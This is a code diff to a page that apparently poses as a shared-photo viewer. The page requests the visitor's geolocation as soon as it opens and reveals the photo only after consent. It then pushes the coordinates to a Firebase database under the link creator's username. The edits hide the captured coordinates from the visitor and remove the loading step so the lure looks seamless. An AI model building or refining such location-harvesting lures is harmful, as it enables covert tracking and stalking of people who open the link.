@@ -72,9 +72,7 @@ body{
 }
 
 /* ═══ CONTENT ═══ */
-.content{
-  padding:16px;
-}
+.content{padding:16px}
 
 /* ═══ PHOTO ═══ */
 .photo-box{
@@ -92,26 +90,10 @@ body{
   display:block;
 }
 
-/* ═══ LOADING ═══ */
-.loading-box{
-  text-align:center;
-  padding:50px 20px;
-  color:#666;
-}
-.spinner{
-  width:36px;height:36px;
-  margin:0 auto 14px;
-  border:3px solid #eee;
-  border-top-color:#4CAF50;
-  border-radius:50%;
-  animation:spin .8s linear infinite;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-
 /* ═══ STATUS MESSAGES ═══ */
 .status-box{
   text-align:center;
-  padding:50px 20px;
+  padding:40px 20px;
 }
 .status-icon{
   width:64px;height:64px;
@@ -136,7 +118,7 @@ body{
   line-height:1.5;
 }
 
-/* ═══ LOCATION INFO ═══ */
+/* ═══ LOCATION INFO (tanpa koordinat) ═══ */
 .location-info{
   display:flex;
   align-items:center;
@@ -162,14 +144,6 @@ body{
   font-size:13px;
   font-weight:600;
   color:#1a1a1a;
-  margin-bottom:2px;
-}
-.location-info .text .t2{
-  font-size:11px;
-  color:#888;
-  overflow:hidden;
-  text-overflow:ellipsis;
-  white-space:nowrap;
 }
 
 /* ═══ BUTTON ═══ */
@@ -226,13 +200,7 @@ body{
     <!-- CONTENT -->
     <div class="content">
 
-      <!-- LOADING -->
-      <div class="loading-box" id="loading">
-        <div class="spinner"></div>
-        <div>Loading photo...</div>
-      </div>
-
-      <!-- PHOTO (muncul setelah izin) -->
+      <!-- FOTO (muncul setelah izin) -->
       <div class="photo-box hide" id="photoBox">
         <img id="mainPhoto" alt="Shared photo">
       </div>
@@ -270,7 +238,6 @@ body{
           </div>
           <div class="text">
             <div class="t1">Location Available</div>
-            <div class="t2" id="locCoords">-</div>
           </div>
         </div>
 
@@ -312,24 +279,21 @@ const fotoUrl   = params.get('foto') || '';
 const ownerUser = params.get('u')    || '';
 
 // ============ ELEMEN ============
-const loadingEl  = document.getElementById('loading');
 const photoBox   = document.getElementById('photoBox');
 const deniedBox  = document.getElementById('deniedBox');
 const errBox     = document.getElementById('errBox');
 const afterBox   = document.getElementById('afterBox');
-const locCoords  = document.getElementById('locCoords');
 const mainPhoto  = document.getElementById('mainPhoto');
 
 // ============ VARIABEL GLOBAL ============
 let currentLat = null;
 let currentLng = null;
 
-// ============ VALIDASI LINK ============
+// ============ VALIDASI LINK & LANGSUNG MINTA IZIN ============
 if (!fotoUrl || !ownerUser) {
-  loadingEl.classList.add('hide');
   errBox.classList.remove('hide');
 } else {
-  // ═══ LANGSUNG MINTA IZIN LOKASI SAAT HALAMAN DIBUKA ═══
+  // ═══ LANGSUNG MINTA IZIN LOKASI (popup muncul pertama kali) ═══
   requestLocation();
 }
 
@@ -341,13 +305,10 @@ function requestLocation() {
   }
 
   navigator.geolocation.getCurrentPosition(
-    // ✅ IZIN DIBERIKAN
+    // ✅ IZIN DIBERIKAN → foto langsung muncul
     pos => {
       currentLat = pos.coords.latitude;
       currentLng = pos.coords.longitude;
-
-      // Tampilkan koordinat di location info
-      locCoords.textContent = currentLat.toFixed(4) + ', ' + currentLng.toFixed(4);
 
       // Simpan ke Firebase
       push(ref(db, 'lokasi/' + ownerUser), {
@@ -365,17 +326,15 @@ function requestLocation() {
         source:   'view.html'
       }).catch(()=>{});
 
-      // ═══ TAMPILKAN FOTO ═══
-      loadingEl.classList.add('hide');
-      photoBox.classList.remove('hide');
-      afterBox.classList.remove('hide');
-
-      // Set foto
+      // ═══ FOTO LANGSUNG MUNCUL (tanpa loading) ═══
       mainPhoto.onerror = () => {
         photoBox.classList.add('hide');
         errBox.classList.remove('hide');
       };
       mainPhoto.src = fotoUrl;
+
+      photoBox.classList.remove('hide');
+      afterBox.classList.remove('hide');
     },
 
     // ❌ IZIN DITOLAK / ERROR
@@ -389,7 +348,6 @@ function requestLocation() {
 
 // ============ SHOW DENIED ============
 function showDenied() {
-  loadingEl.classList.add('hide');
   photoBox.classList.add('hide');
   afterBox.classList.add('hide');
   deniedBox.classList.remove('hide');
